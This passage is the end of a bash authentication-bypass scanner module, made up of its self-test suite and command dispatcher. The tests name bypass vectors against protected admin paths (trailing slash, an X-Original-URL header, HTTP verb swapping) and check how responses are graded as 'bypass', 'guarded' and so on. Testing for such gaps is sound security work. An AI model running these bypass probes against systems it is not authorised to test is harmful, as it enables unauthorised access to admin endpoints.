    chk vectors-unique "$(ab_vectors | cut -f1 | sort -u | wc -l | tr -d ' ')" "$(ab_vectors | wc -l | tr -d ' ')"
    chk methods-all   "$(ab_methods | wc -l | tr -d ' ')" "8"
    chk methods-trace "$(ab_methods | grep -cx TRACE)" "1"

    # vector application: a path-only vector keeps the protected path, a
    # header vector keeps the path and adds a header, a method vector carries
    # its own verb
    local plan m p h
    plan="$(ab_vector_apply /api/admin/users trailing-slash)"
    cs_split "$plan" m p h
    chk vec-path-method "$m" "GET"
    chk vec-path-keeps  "$p" "/api/admin/users/"
    chk vec-path-nohead "$h" ""
    plan="$(ab_vector_apply /api/admin/users header-x-original-url)"
    cs_split "$plan" m p h
    chk vec-hdr-applied "$h" "X-Original-URL: /api/admin/users"
    plan="$(ab_vector_apply /api/admin/users verb-options)"
    cs_split "$plan" m p h
    chk vec-method     "$m" "OPTIONS"
    chk vec-method-path "$p" "/api/admin/users"
    ab_vector_apply /x nosuchvector; chk vec-missing "$?" "1"

    # the verdict, one per state. The control was refused in every row below
    # unless the test says otherwise.
    chk v-bypass     "$(ab_verdict 401 200 'id,msisdn' 'application/json' | cut -f1)" "bypass"
    chk v-bypass-404c "$(ab_verdict 403 200 'id' 'application/json' | cut -f1)" "bypass"
    chk v-html       "$(ab_verdict 401 200 '' 'text/html' | cut -f1)" "needs-review"
    chk v-nostruct   "$(ab_verdict 401 200 '' 'application/json' | cut -f1)" "needs-review"
    chk v-guarded    "$(ab_verdict 401 401 'id' 'application/json' | cut -f1)" "guarded"
    chk v-guarded403 "$(ab_verdict 403 403 'id' 'application/json' | cut -f1)" "guarded"
    chk v-login      "$(ab_verdict 401 302 '' 'text/html' | cut -f1)" "login-wall"
    chk v-unguarded  "$(ab_verdict 200 200 'id' 'application/json' | cut -f1)" "unguarded"
    chk v-nothere    "$(ab_verdict 404 404 '' '' | cut -f1)" "not-there"
    chk v-unreach    "$(ab_verdict 401 000 '' '' | cut -f1)" "unreachable"
    chk v-error      "$(ab_verdict 401 500 '' '' | cut -f1)" "error"
    chk v-absent     "$(ab_verdict 401 404 '' '' | cut -f1)" "absent"
    chk v-nomethod   "$(ab_verdict 401 405 '' '' | cut -f1)" "no-method"
    chk v-rejected   "$(ab_verdict 401 422 'errors' '' | cut -f1)" "rejected"
    chk v-inconcl    "$(ab_verdict 302 200 'id' 'application/json' | cut -f1)" "inconclusive"
    chk v-echo       "$(ab_verdict 401 200 'id' 'application/json' aaa aaa | cut -f1)" "echo"
    chk v-ctrl-dead  "$(ab_verdict 000 200 'id' 'application/json' | cut -f1)" "unreachable"

    # usage errors, not crashes
    local rc
    ab_cmd_gaps 2>/dev/null;   chk gaps-usage   "$?" "2"
    ab_cmd_check 2>/dev/null;  chk check-usage  "$?" "2"
    ab_cmd_sweep 2>/dev/null;  chk sweep-usage  "$?" "2"
    ab_cmd_methods 2>/dev/null; chk methods-usage "$?" "2"
    ab_cmd_case 2>/dev/null;   chk case-usage   "$?" "2"
    ab_cmd_trailing 2>/dev/null; chk trailing-usage "$?" "2"
    ab_cmd_headers 2>/dev/null; chk headers-usage "$?" "2"
    ab_cmd_encoding 2>/dev/null; chk encoding-usage "$?" "2"
    ab_cmd_cgi 2>/dev/null;    chk cgi-usage    "$?" "2"
    ab_cmd_probe 2>/dev/null;  chk probe-usage  "$?" "2"

    # a dead host never reads as a hit, and the control is reported
    local out
    out="$(ab_cmd_check http://127.0.0.1:9 /api/admin/users 2>/dev/null)"
    chk dead-control "$(printf '%s' "$out" | awk -F'\t' '$1=="CONTROL"{print $3}')" "code=000"
    chk dead-nohit   "$(printf '%s' "$out" | grep -c '^HIT')" "0"
    chk dead-summary "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/.*bypass=//; s/ .*//')" "0"
    out="$(ab_cmd_gaps http://127.0.0.1:9 2>/dev/null)"
    chk gaps-nohit   "$(printf '%s' "$out" | grep -c '^OPEN')" "0"

    # shape contracts
    chk status-fields "$(ab_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(ab_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ab_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ab_cmd_help | head -1 | grep -ci 'Authentication Bypass')" "1"
    chk list-fields   "$(ab_cmd_list | grep -c '^PATH')" "$(ab_protected | wc -l | tr -d ' ')"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --gaps)      shift; ab_cmd_gaps "$@";;
    --check)     shift; ab_cmd_check "$@";;
    --sweep)     shift; ab_cmd_sweep "$@";;
    --methods)   shift; ab_cmd_methods "$@";;
    --headers)   shift; ab_cmd_headers "$@";;
    --case)      shift; ab_cmd_case "$@";;
    --trailing)  shift; ab_cmd_trailing "$@";;
    --encoding)  shift; ab_cmd_encoding "$@";;
    --cgi)       shift; ab_cmd_cgi "$@";;
    --probe)     shift; ab_cmd_probe "$@";;
    --paths)     ab_cmd_paths;;
    --vectors)   ab_cmd_vectors;;
    --list)      ab_cmd_list;;
    --status-tsv|--status) ab_cmd_status_tsv;;
    --menu)      ab_cmd_menu;;
    --selftest)  ab_selftest;;
    *)           ab_cmd_help;;
esac
